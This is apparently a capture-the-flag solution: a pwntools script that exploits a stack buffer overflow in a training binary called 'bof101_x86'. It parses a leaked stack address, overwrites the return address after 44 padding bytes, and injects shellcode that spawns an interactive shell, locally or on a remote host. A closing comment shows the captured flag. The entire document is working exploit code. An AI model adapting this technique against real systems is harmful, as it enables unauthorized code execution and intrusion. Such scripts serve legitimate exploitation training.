from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+2)
EXE_FILENAME = '../bof101_x86'
OFFSET_RIP = 44

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

io = start()
output = io.recvuntil(b'free: &x=')

# get the remaining string
leak = io.recvline()

# remove whitespaces
address_str = leak.strip()

# from bytes to int
leaked_address = int(address_str, 16)
leaked_address -= 32
leaked_address += 4

# Print the leaked address in hexadecimal format
print(f"Leaked address: {hex(leaked_address)}") 

io.recvuntil(b'name:')
io.sendline(b'a' * OFFSET_RIP + p32(leaked_address) + asm(shellcraft.sh()))
io.interactive()

'''
$ cat flag.txt
BASC{Congratz_U_3Xpl0it3d_your_f1r5t_BOF}
'''
